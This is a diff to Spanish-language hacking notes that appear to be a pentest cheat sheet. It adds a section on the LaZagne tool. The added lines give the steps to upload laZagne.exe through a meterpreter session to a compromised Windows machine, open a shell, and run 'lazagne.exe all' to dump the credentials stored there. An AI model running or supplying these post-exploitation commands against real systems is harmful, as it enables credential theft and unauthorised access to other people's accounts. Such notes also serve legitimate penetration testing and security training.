@@ -504,6 +504,18 @@ rmdir <nombre directorio> (Borrar directorio)
 ---- Ejemplo de comando a ejecutar: start firefox bing.com (Permite abrir el navegador firefox y dirigirnos al sitio web bing)
 ---- Ejemplo de comando a ejecutar: shutdown -s -t 100 (Permite apagar el equipo en 1 minuto)
 
+++ Lazagne 
+--- URL: https://github.com/AlessandroZ/LaZagne
+--- Navegar al directorio del programa
+--- meterpreter> upload Windows/laZagne.exe (Manda el archivo desde kali al equipo con Windows)
+--- shell
+--- lazagne.exe all
+--- Se nos mostrarán las credenciales alojadas en el equipo Windows 
+
+
+
+
+
 
 
 
